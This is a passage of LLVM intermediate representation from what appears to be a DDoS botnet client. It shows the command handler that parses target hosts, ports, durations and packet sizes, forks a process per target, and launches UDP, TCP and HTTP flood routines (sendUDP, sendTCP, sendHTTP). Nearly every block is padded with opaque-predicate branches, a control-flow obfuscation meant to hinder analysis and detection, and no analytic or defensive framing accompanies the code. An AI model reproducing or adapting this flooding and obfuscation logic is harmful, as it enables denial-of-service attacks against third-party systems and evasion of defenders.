  br i1 %651, label %661, label %652

; <label>:652:                                    ; preds = %649
  %653 = load i8*, i8** %21, align 8
  %654 = load i32, i32* %22, align 4
  %655 = load i32, i32* %23, align 4
  %656 = load i32, i32* %24, align 4
  %657 = load i32, i32* %25, align 4
  %658 = load i32, i32* %26, align 4
  %659 = load i32, i32* %27, align 4
  %660 = load i32, i32* %28, align 4
  call void @sendUDP(i8* %653, i32 %654, i32 %655, i32 %656, i32 %657, i32 %658, i32 %659, i32 %660)
  call void @_exit(i32 0) #12
  unreachable

; <label>:661:                                    ; preds = %649
  br label %662

; <label>:662:                                    ; preds = %661, %648
  %663 = load i32, i32* @x.77
  %664 = load i32, i32* @y.78
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %662
  %671 = load i32, i32* @x.77
  %672 = load i32, i32* @y.78
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %1553

; <label>:679:                                    ; preds = %418
  %680 = load i32, i32* @x.77
  %681 = load i32, i32* @y.78
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %679
  %688 = load i8**, i8*** %12, align 8
  %689 = getelementptr inbounds i8*, i8** %688, i64 0
  %690 = load i8*, i8** %689, align 8
  %691 = call i32 @strcmp(i8* %690, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #10
  %692 = icmp ne i32 %691, 0
  %693 = load i32, i32* @x.77
  %694 = load i32, i32* @y.78
  %695 = sub i32 %693, 1
  %696 = mul i32 %693, %695
  %697 = urem i32 %696, 2
  %698 = icmp eq i32 %697, 0
  %699 = icmp slt i32 %694, 10
  %700 = or i1 %698, %699
  br i1 %700, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %692, label %982, label %701

; <label>:701:                                    ; preds = %originalBBpart276
  %702 = load i32, i32* @x.77
  %703 = load i32, i32* @y.78
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %701
  %710 = load i32, i32* %11, align 4
  %711 = icmp slt i32 %710, 6
  %712 = load i32, i32* @x.77
  %713 = load i32, i32* @y.78
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %711, label %810, label %720

; <label>:720:                                    ; preds = %originalBBpart280
  %721 = load i8**, i8*** %12, align 8
  %722 = getelementptr inbounds i8*, i8** %721, i64 3
  %723 = load i8*, i8** %722, align 8
  %724 = call i32 @atoi(i8* %723) #10
  %725 = icmp eq i32 %724, -1
  br i1 %725, label %810, label %726

; <label>:726:                                    ; preds = %720
  %727 = load i32, i32* @x.77
  %728 = load i32, i32* @y.78
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %726
  %735 = load i8**, i8*** %12, align 8
  %736 = getelementptr inbounds i8*, i8** %735, i64 2
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @atoi(i8* %737) #10
  %739 = icmp eq i32 %738, -1
  %740 = load i32, i32* @x.77
  %741 = load i32, i32* @y.78
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %739, label %810, label %748

; <label>:748:                                    ; preds = %originalBBpart284
  %749 = load i32, i32* @x.77
  %750 = load i32, i32* @y.78
  %751 = sub i32 %749, 1
  %752 = mul i32 %749, %751
  %753 = urem i32 %752, 2
  %754 = icmp eq i32 %753, 0
  %755 = icmp slt i32 %750, 10
  %756 = or i1 %754, %755
  br i1 %756, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %748
  %757 = load i8**, i8*** %12, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 4
  %759 = load i8*, i8** %758, align 8
  %760 = call i32 @atoi(i8* %759) #10
  %761 = icmp eq i32 %760, -1
  %762 = load i32, i32* @x.77
  %763 = load i32, i32* @y.78
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %761, label %810, label %770

; <label>:770:                                    ; preds = %originalBBpart288
  %771 = load i8**, i8*** %12, align 8
  %772 = getelementptr inbounds i8*, i8** %771, i64 4
  %773 = load i8*, i8** %772, align 8
  %774 = call i32 @atoi(i8* %773) #10
  %775 = icmp sgt i32 %774, 32
  br i1 %775, label %810, label %776

; <label>:776:                                    ; preds = %770
  %777 = load i32, i32* @x.77
  %778 = load i32, i32* @y.78
  %779 = sub i32 %777, 1
  %780 = mul i32 %777, %779
  %781 = urem i32 %780, 2
  %782 = icmp eq i32 %781, 0
  %783 = icmp slt i32 %778, 10
  %784 = or i1 %782, %783
  br i1 %784, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %776
  %785 = load i32, i32* %11, align 4
  %786 = icmp sgt i32 %785, 6
  %787 = load i32, i32* @x.77
  %788 = load i32, i32* @y.78
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %786, label %795, label %801

; <label>:795:                                    ; preds = %originalBBpart292
  %796 = load i8**, i8*** %12, align 8
  %797 = getelementptr inbounds i8*, i8** %796, i64 6
  %798 = load i8*, i8** %797, align 8
  %799 = call i32 @atoi(i8* %798) #10
  %800 = icmp slt i32 %799, 0
  br i1 %800, label %810, label %801

; <label>:801:                                    ; preds = %795, %originalBBpart292
  %802 = load i32, i32* %11, align 4
  %803 = icmp eq i32 %802, 8
  br i1 %803, label %804, label %811

; <label>:804:                                    ; preds = %801
  %805 = load i8**, i8*** %12, align 8
  %806 = getelementptr inbounds i8*, i8** %805, i64 7
  %807 = load i8*, i8** %806, align 8
  %808 = call i32 @atoi(i8* %807) #10
  %809 = icmp slt i32 %808, 1
  br i1 %809, label %810, label %811

; <label>:810:                                    ; preds = %804, %795, %770, %originalBBpart288, %originalBBpart284, %720, %originalBBpart280
  br label %1553

; <label>:811:                                    ; preds = %804, %801
  %812 = load i8**, i8*** %12, align 8
  %813 = getelementptr inbounds i8*, i8** %812, i64 1
  %814 = load i8*, i8** %813, align 8
  store i8* %814, i8** %30, align 8
  %815 = load i8**, i8*** %12, align 8
  %816 = getelementptr inbounds i8*, i8** %815, i64 2
  %817 = load i8*, i8** %816, align 8
  %818 = call i32 @atoi(i8* %817) #10
  store i32 %818, i32* %31, align 4
  %819 = load i8**, i8*** %12, align 8
  %820 = getelementptr inbounds i8*, i8** %819, i64 3
  %821 = load i8*, i8** %820, align 8
  %822 = call i32 @atoi(i8* %821) #10
  store i32 %822, i32* %32, align 4
  %823 = load i8**, i8*** %12, align 8
  %824 = getelementptr inbounds i8*, i8** %823, i64 4
  %825 = load i8*, i8** %824, align 8
  %826 = call i32 @atoi(i8* %825) #10
  store i32 %826, i32* %33, align 4
  %827 = load i8**, i8*** %12, align 8
  %828 = getelementptr inbounds i8*, i8** %827, i64 5
  %829 = load i8*, i8** %828, align 8
  store i8* %829, i8** %34, align 8
  %830 = load i32, i32* %11, align 4
  %831 = icmp eq i32 %830, 8
  br i1 %831, label %832, label %837

; <label>:832:                                    ; preds = %811
  %833 = load i8**, i8*** %12, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 7
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @atoi(i8* %835) #10
  br label %838

; <label>:837:                                    ; preds = %811
  br label %838

; <label>:838:                                    ; preds = %837, %832
  %839 = phi i32 [ %836, %832 ], [ 10, %837 ]
  %840 = load i32, i32* @x.77
  %841 = load i32, i32* @y.78
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %838
  store i32 %839, i32* %35, align 4
  %848 = load i32, i32* %11, align 4
  %849 = icmp sgt i32 %848, 6
  %850 = load i32, i32* @x.77
  %851 = load i32, i32* @y.78
  %852 = sub i32 %850, 1
  %853 = mul i32 %850, %852
  %854 = urem i32 %853, 2
  %855 = icmp eq i32 %854, 0
  %856 = icmp slt i32 %851, 10
  %857 = or i1 %855, %856
  br i1 %857, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %849, label %858, label %863

; <label>:858:                                    ; preds = %originalBBpart296
  %859 = load i8**, i8*** %12, align 8
  %860 = getelementptr inbounds i8*, i8** %859, i64 6
  %861 = load i8*, i8** %860, align 8
  %862 = call i32 @atoi(i8* %861) #10
  br label %864

; <label>:863:                                    ; preds = %originalBBpart296
  br label %864

; <label>:864:                                    ; preds = %863, %858
  %865 = phi i32 [ %862, %858 ], [ 0, %863 ]
  store i32 %865, i32* %36, align 4
  %866 = load i8*, i8** %30, align 8
  %867 = call i8* @strstr(i8* %866, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %868 = icmp ne i8* %867, null
  br i1 %868, label %869, label %921

; <label>:869:                                    ; preds = %864
  %870 = load i8*, i8** %30, align 8
  %871 = call i8* @strtok(i8* %870, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %871, i8** %37, align 8
  br label %872

; <label>:872:                                    ; preds = %918, %869
  %873 = load i8*, i8** %37, align 8
  %874 = icmp ne i8* %873, null
  br i1 %874, label %875, label %920

; <label>:875:                                    ; preds = %872
  %876 = load i32, i32* @x.77
  %877 = load i32, i32* @y.78
  %878 = sub i32 %876, 1
  %879 = mul i32 %876, %878
  %880 = urem i32 %879, 2
  %881 = icmp eq i32 %880, 0
  %882 = icmp slt i32 %877, 10
  %883 = or i1 %881, %882
  br i1 %883, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %875
  %884 = call i32 @listFork()
  %885 = icmp ne i32 %884, 0
  %886 = load i32, i32* @x.77
  %887 = load i32, i32* @y.78
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %885, label %918, label %894

; <label>:894:                                    ; preds = %originalBBpart2100
  %895 = load i32, i32* @x.77
  %896 = load i32, i32* @y.78
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %894
  %903 = load i8*, i8** %37, align 8
  %904 = load i32, i32* %31, align 4
  %905 = load i32, i32* %32, align 4
  %906 = load i32, i32* %33, align 4
  %907 = load i8*, i8** %34, align 8
  %908 = load i32, i32* %36, align 4
  %909 = load i32, i32* %35, align 4
  call void @sendTCP(i8* %903, i32 %904, i32 %905, i32 %906, i8* %907, i32 %908, i32 %909)
  call void @_exit(i32 0) #12
  %910 = load i32, i32* @x.77
  %911 = load i32, i32* @y.78
  %912 = sub i32 %910, 1
  %913 = mul i32 %910, %912
  %914 = urem i32 %913, 2
  %915 = icmp eq i32 %914, 0
  %916 = icmp slt i32 %911, 10
  %917 = or i1 %915, %916
  br i1 %917, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  unreachable

; <label>:918:                                    ; preds = %originalBBpart2100
  %919 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %919, i8** %37, align 8
  br label %872

; <label>:920:                                    ; preds = %872
  br label %965

; <label>:921:                                    ; preds = %864
  %922 = load i32, i32* @x.77
  %923 = load i32, i32* @y.78
  %924 = sub i32 %922, 1
  %925 = mul i32 %922, %924
  %926 = urem i32 %925, 2
  %927 = icmp eq i32 %926, 0
  %928 = icmp slt i32 %923, 10
  %929 = or i1 %927, %928
  br i1 %929, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %921
  %930 = call i32 @listFork()
  %931 = icmp ne i32 %930, 0
  %932 = load i32, i32* @x.77
  %933 = load i32, i32* @y.78
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %931, label %964, label %940

; <label>:940:                                    ; preds = %originalBBpart2108
  %941 = load i32, i32* @x.77
  %942 = load i32, i32* @y.78
  %943 = sub i32 %941, 1
  %944 = mul i32 %941, %943
  %945 = urem i32 %944, 2
  %946 = icmp eq i32 %945, 0
  %947 = icmp slt i32 %942, 10
  %948 = or i1 %946, %947
  br i1 %948, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %940
  %949 = load i8*, i8** %30, align 8
  %950 = load i32, i32* %31, align 4
  %951 = load i32, i32* %32, align 4
  %952 = load i32, i32* %33, align 4
  %953 = load i8*, i8** %34, align 8
  %954 = load i32, i32* %36, align 4
  %955 = load i32, i32* %35, align 4
  call void @sendTCP(i8* %949, i32 %950, i32 %951, i32 %952, i8* %953, i32 %954, i32 %955)
  call void @_exit(i32 0) #12
  %956 = load i32, i32* @x.77
  %957 = load i32, i32* @y.78
  %958 = sub i32 %956, 1
  %959 = mul i32 %956, %958
  %960 = urem i32 %959, 2
  %961 = icmp eq i32 %960, 0
  %962 = icmp slt i32 %957, 10
  %963 = or i1 %961, %962
  br i1 %963, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  unreachable

; <label>:964:                                    ; preds = %originalBBpart2108
  br label %965

; <label>:965:                                    ; preds = %964, %920
  %966 = load i32, i32* @x.77
  %967 = load i32, i32* @y.78
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %965
  %974 = load i32, i32* @x.77
  %975 = load i32, i32* @y.78
  %976 = sub i32 %974, 1
  %977 = mul i32 %974, %976
  %978 = urem i32 %977, 2
  %979 = icmp eq i32 %978, 0
  %980 = icmp slt i32 %975, 10
  %981 = or i1 %979, %980
  br i1 %981, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1553

; <label>:982:                                    ; preds = %originalBBpart276
  %983 = load i32, i32* @x.77
  %984 = load i32, i32* @y.78
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %982
  %991 = load i8**, i8*** %12, align 8
  %992 = getelementptr inbounds i8*, i8** %991, i64 0
  %993 = load i8*, i8** %992, align 8
  %994 = call i32 @strcmp(i8* %993, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i32 0, i32 0)) #10
  %995 = icmp ne i32 %994, 0
  %996 = load i32, i32* @x.77
  %997 = load i32, i32* @y.78
  %998 = sub i32 %996, 1
  %999 = mul i32 %996, %998
  %1000 = urem i32 %999, 2
  %1001 = icmp eq i32 %1000, 0
  %1002 = icmp slt i32 %997, 10
  %1003 = or i1 %1001, %1002
  br i1 %1003, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %995, label %1116, label %1004

; <label>:1004:                                   ; preds = %originalBBpart2120
  %1005 = load i32, i32* %11, align 4
  %1006 = icmp slt i32 %1005, 4
  br i1 %1006, label %1035, label %1007

; <label>:1007:                                   ; preds = %1004
  %1008 = load i8**, i8*** %12, align 8
  %1009 = getelementptr inbounds i8*, i8** %1008, i64 2
  %1010 = load i8*, i8** %1009, align 8
  %1011 = call i32 @atoi(i8* %1010) #10
  %1012 = icmp slt i32 %1011, 1
  br i1 %1012, label %1035, label %1013

; <label>:1013:                                   ; preds = %1007
  %1014 = load i32, i32* @x.77
  %1015 = load i32, i32* @y.78
  %1016 = sub i32 %1014, 1
  %1017 = mul i32 %1014, %1016
  %1018 = urem i32 %1017, 2
  %1019 = icmp eq i32 %1018, 0
  %1020 = icmp slt i32 %1015, 10
  %1021 = or i1 %1019, %1020
  br i1 %1021, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1013
  %1022 = load i8**, i8*** %12, align 8
  %1023 = getelementptr inbounds i8*, i8** %1022, i64 3
  %1024 = load i8*, i8** %1023, align 8
  %1025 = call i32 @atoi(i8* %1024) #10
  %1026 = icmp slt i32 %1025, 1
  %1027 = load i32, i32* @x.77
  %1028 = load i32, i32* @y.78
  %1029 = sub i32 %1027, 1
  %1030 = mul i32 %1027, %1029
  %1031 = urem i32 %1030, 2
  %1032 = icmp eq i32 %1031, 0
  %1033 = icmp slt i32 %1028, 10
  %1034 = or i1 %1032, %1033
  br i1 %1034, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1026, label %1035, label %1036

; <label>:1035:                                   ; preds = %originalBBpart2124, %1007, %1004
  br label %1553

; <label>:1036:                                   ; preds = %originalBBpart2124
  %1037 = load i32, i32* @x.77
  %1038 = load i32, i32* @y.78
  %1039 = sub i32 %1037, 1
  %1040 = mul i32 %1037, %1039
  %1041 = urem i32 %1040, 2
  %1042 = icmp eq i32 %1041, 0
  %1043 = icmp slt i32 %1038, 10
  %1044 = or i1 %1042, %1043
  br i1 %1044, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1036
  %1045 = load i8**, i8*** %12, align 8
  %1046 = getelementptr inbounds i8*, i8** %1045, i64 1
  %1047 = load i8*, i8** %1046, align 8
  store i8* %1047, i8** %38, align 8
  %1048 = load i8**, i8*** %12, align 8
  %1049 = getelementptr inbounds i8*, i8** %1048, i64 2
  %1050 = load i8*, i8** %1049, align 8
  %1051 = call i32 @atoi(i8* %1050) #10
  store i32 %1051, i32* %39, align 4
  %1052 = load i8**, i8*** %12, align 8
  %1053 = getelementptr inbounds i8*, i8** %1052, i64 3
  %1054 = load i8*, i8** %1053, align 8
  %1055 = call i32 @atoi(i8* %1054) #10
  store i32 %1055, i32* %40, align 4
  %1056 = load i8*, i8** %38, align 8
  %1057 = call i8* @strstr(i8* %1056, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %1058 = icmp ne i8* %1057, null
  %1059 = load i32, i32* @x.77
  %1060 = load i32, i32* @y.78
  %1061 = sub i32 %1059, 1
  %1062 = mul i32 %1059, %1061
  %1063 = urem i32 %1062, 2
  %1064 = icmp eq i32 %1063, 0
  %1065 = icmp slt i32 %1060, 10
  %1066 = or i1 %1064, %1065
  br i1 %1066, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1058, label %1067, label %1095

; <label>:1067:                                   ; preds = %originalBBpart2128
  %1068 = load i8*, i8** %38, align 8
  %1069 = call i8* @strtok(i8* %1068, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1069, i8** %41, align 8
  br label %1070

; <label>:1070:                                   ; preds = %1073, %1067
  %1071 = load i8*, i8** %41, align 8
  %1072 = icmp ne i8* %1071, null
  br i1 %1072, label %1073, label %1078

; <label>:1073:                                   ; preds = %1070
  %1074 = load i8*, i8** %41, align 8
  %1075 = load i32, i32* %39, align 4
  %1076 = load i32, i32* %40, align 4
  call void @sendHTTP(i8* %1074, i32 %1075, i32 %1076)
  %1077 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1077, i8** %41, align 8
  br label %1070

; <label>:1078:                                   ; preds = %1070
  %1079 = load i32, i32* @x.77
  %1080 = load i32, i32* @y.78
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1078
  %1087 = load i32, i32* @x.77
  %1088 = load i32, i32* @y.78
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1099

; <label>:1095:                                   ; preds = %originalBBpart2128
  %1096 = load i8*, i8** %38, align 8
  %1097 = load i32, i32* %39, align 4
  %1098 = load i32, i32* %40, align 4
  call void @sendHTTP(i8* %1096, i32 %1097, i32 %1098)
  br label %1099

; <label>:1099:                                   ; preds = %1095, %originalBBpart2132
  %1100 = load i32, i32* @x.77
  %1101 = load i32, i32* @y.78
  %1102 = sub i32 %1100, 1
  %1103 = mul i32 %1100, %1102
  %1104 = urem i32 %1103, 2
  %1105 = icmp eq i32 %1104, 0
  %1106 = icmp slt i32 %1101, 10
  %1107 = or i1 %1105, %1106
  br i1 %1107, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1099
  %1108 = load i32, i32* @x.77
  %1109 = load i32, i32* @y.78
  %1110 = sub i32 %1108, 1
  %1111 = mul i32 %1108, %1110
  %1112 = urem i32 %1111, 2
  %1113 = icmp eq i32 %1112, 0
  %1114 = icmp slt i32 %1109, 10
  %1115 = or i1 %1113, %1114
  br i1 %1115, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1553

; <label>:1116:                                   ; preds = %originalBBpart2120
  %1117 = load i8**, i8*** %12, align 8
  %1118 = getelementptr inbounds i8*, i8** %1117, i64 0
  %1119 = load i8*, i8** %1118, align 8
  %1120 = call i32 @strcmp(i8* %1119, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #10
  %1121 = icmp ne i32 %1120, 0
  br i1 %1121, label %1308, label %1122

; <label>:1122:                                   ; preds = %1116
  %1123 = load i32, i32* @x.77
  %1124 = load i32, i32* @y.78
  %1125 = sub i32 %1123, 1
  %1126 = mul i32 %1123, %1125
  %1127 = urem i32 %1126, 2
  %1128 = icmp eq i32 %1127, 0
  %1129 = icmp slt i32 %1124, 10
  %1130 = or i1 %1128, %1129
  br i1 %1130, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1122
  %1131 = load i32, i32* %11, align 4
  %1132 = icmp slt i32 %1131, 4
  %1133 = load i32, i32* @x.77
  %1134 = load i32, i32* @y.78
  %1135 = sub i32 %1133, 1
  %1136 = mul i32 %1133, %1135
  %1137 = urem i32 %1136, 2
  %1138 = icmp eq i32 %1137, 0
  %1139 = icmp slt i32 %1134, 10
  %1140 = or i1 %1138, %1139
  br i1 %1140, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1132, label %1169, label %1141

; <label>:1141:                                   ; preds = %originalBBpart2140
  %1142 = load i32, i32* @x.77
  %1143 = load i32, i32* @y.78
  %1144 = sub i32 %1142, 1
  %1145 = mul i32 %1142, %1144
  %1146 = urem i32 %1145, 2
  %1147 = icmp eq i32 %1146, 0
  %1148 = icmp slt i32 %1143, 10
  %1149 = or i1 %1147, %1148
  br i1 %1149, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1141
  %1150 = load i8**, i8*** %12, align 8
  %1151 = getelementptr inbounds i8*, i8** %1150, i64 2
  %1152 = load i8*, i8** %1151, align 8
  %1153 = call i32 @atoi(i8* %1152) #10
  %1154 = icmp slt i32 %1153, 1
  %1155 = load i32, i32* @x.77
  %1156 = load i32, i32* @y.78
  %1157 = sub i32 %1155, 1
  %1158 = mul i32 %1155, %1157
  %1159 = urem i32 %1158, 2
  %1160 = icmp eq i32 %1159, 0
  %1161 = icmp slt i32 %1156, 10
  %1162 = or i1 %1160, %1161
  br i1 %1162, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1154, label %1169, label %1163

; <label>:1163:                                   ; preds = %originalBBpart2144
  %1164 = load i8**, i8*** %12, align 8
  %1165 = getelementptr inbounds i8*, i8** %1164, i64 3
  %1166 = load i8*, i8** %1165, align 8
  %1167 = call i32 @atoi(i8* %1166) #10
  %1168 = icmp slt i32 %1167, 1
  br i1 %1168, label %1169, label %1170

; <label>:1169:                                   ; preds = %1163, %originalBBpart2144, %originalBBpart2140
  br label %1553

; <label>:1170:                                   ; preds = %1163
  %1171 = load i8**, i8*** %12, align 8
  %1172 = getelementptr inbounds i8*, i8** %1171, i64 1
  %1173 = load i8*, i8** %1172, align 8
  store i8* %1173, i8** %42, align 8
  %1174 = load i8**, i8*** %12, align 8
  %1175 = getelementptr inbounds i8*, i8** %1174, i64 2
  %1176 = load i8*, i8** %1175, align 8
  %1177 = call i32 @atoi(i8* %1176) #10
  store i32 %1177, i32* %43, align 4
  %1178 = load i8**, i8*** %12, align 8
  %1179 = getelementptr inbounds i8*, i8** %1178, i64 3
  %1180 = load i8*, i8** %1179, align 8
  %1181 = call i32 @atoi(i8* %1180) #10
  store i32 %1181, i32* %44, align 4
  %1182 = load i8*, i8** %42, align 8
  %1183 = call i8* @strstr(i8* %1182, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %1184 = icmp ne i8* %1183, null
  br i1 %1184, label %1185, label %1251

; <label>:1185:                                   ; preds = %1170
  %1186 = load i32, i32* @x.77
  %1187 = load i32, i32* @y.78
  %1188 = sub i32 %1186, 1
  %1189 = mul i32 %1186, %1188
  %1190 = urem i32 %1189, 2
  %1191 = icmp eq i32 %1190, 0
  %1192 = icmp slt i32 %1187, 10
  %1193 = or i1 %1191, %1192
  br i1 %1193, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1185
  %1194 = load i8*, i8** %42, align 8
  %1195 = call i8* @strtok(i8* %1194, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1195, i8** %45, align 8
  %1196 = load i32, i32* @x.77
  %1197 = load i32, i32* @y.78
  %1198 = sub i32 %1196, 1
  %1199 = mul i32 %1196, %1198
  %1200 = urem i32 %1199, 2
  %1201 = icmp eq i32 %1200, 0
  %1202 = icmp slt i32 %1197, 10
  %1203 = or i1 %1201, %1202
  br i1 %1203, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1204

; <label>:1204:                                   ; preds = %1248, %originalBBpart2148
  %1205 = load i32, i32* @x.77
  %1206 = load i32, i32* @y.78
  %1207 = sub i32 %1205, 1
  %1208 = mul i32 %1205, %1207
  %1209 = urem i32 %1208, 2
